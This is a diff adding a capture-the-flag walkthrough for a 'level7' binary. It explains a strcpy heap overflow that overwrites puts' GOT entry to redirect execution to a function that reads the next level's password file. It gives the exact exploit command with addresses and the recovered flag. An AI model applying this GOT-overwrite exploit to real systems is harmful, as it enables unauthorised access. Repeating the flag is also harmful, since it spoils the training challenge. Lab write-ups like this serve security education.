@@ -1,0 +1,30 @@
+HOW TO FIND THE FLAG:
+
+As usual we are going to analyse the binary file level7
+
+gdb level7 => 'info functions' -> we see the use of printf fgets and strcpy. We don't know yet which vulnerability we are going to exploit here. String format vulnerability, strcpy security exploit ? Let's dive into the assembly code
+
+'disas main' => There is 4 malloc => 2 malloc in order to malloc the structures and 2 for the buffer inside the struc.
+
+Then 2 strcpy : argv[1] copied into buf of structure 1
+                argv[2] copied into buf of structure 2
+
+The goal here is to call the function m that prints the value of the global variable c in which there is the value of "/home/user/level8/.pass"
+
+In order the do this we are going to change the value of the puts function in the global offset table<
+
+First let's find the offset where the segfault occurs. 
+
+With wiremask we use the buffer overflow pattern generator -> ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag lol => we see the offset is 20
+
+The attack will look like this then :
+
+./level7 `python -c "print 'A' * 20 + GOT adress of puts` `python -c "print 'Adress of function m'"`
+
+objdump -R level7 -> puts GOT is 08049928
+
+'info functions' -> adress of m 080484f4
+
+So the attack is ./level7 `python -c "print 'A' * 20 + '\x28\x99\x04\x08'"` `python -c "print '\xf4\x84\x04\x08'"`
+
+and we get the flag 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
